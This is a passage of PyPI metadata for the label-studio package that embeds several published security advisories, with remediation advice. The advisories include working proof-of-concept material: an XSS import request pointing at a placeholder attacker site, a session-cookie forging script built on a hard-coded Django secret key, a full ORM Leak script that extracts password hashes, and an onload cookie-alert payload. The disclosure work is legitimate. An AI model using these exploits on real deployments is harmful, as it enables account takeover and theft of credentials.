verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.8.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.8.1/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.19)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (==2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.54rc0)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.8.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"5989d5f3d6faecbb3703a83a06a4478d0fee44501b7146d6d6009a55b5063b68","md5":"4ade512a3f4ca669817faf249db9ae48","sha256":"b39631d6cc1046a9745d9fd0a014ea3fd68fdba139b67e4c344157dea74cc66e"},"downloads":-1,"filename":"label_studio-1.8.1-py3-none-any.whl","has_sig":false,"md5_digest":"4ade512a3f4ca669817faf249db9ae48","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":53033990,"upload_time":"2023-08-02T13:58:19","upload_time_iso_8601":"2023-08-02T13:58:19.293532Z","url":"https://files.pythonhosted.org/packages/59/89/d5f3d6faecbb3703a83a06a4478d0fee44501b7146d6d6009a55b5063b68/label_studio-1.8.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"18d6992c49b4e768cd4b0492293b52543ac2481ca792e4e88eb3da4bc59d46e3","md5":"019afabd1dae8c1ea0538d7cc461fb93","sha256":"a110fed3053189982568f63e33e9d45cad9363613ae1d3e0cf3e35c05cc8f52e"},"downloads":-1,"filename":"label-studio-1.8.1.tar.gz","has_sig":false,"md5_digest":"019afabd1dae8c1ea0538d7cc461fb93","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":51991232,"upload_time":"2023-08-02T13:58:24","upload_time_iso_8601":"2023-08-02T13:58:24.273687Z","url":"https://files.pythonhosted.org/packages/18/d6/992c49b4e768cd4b0492293b52543ac2481ca792e4e88eb3da4bc59d46e3/label-studio-1.8.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for 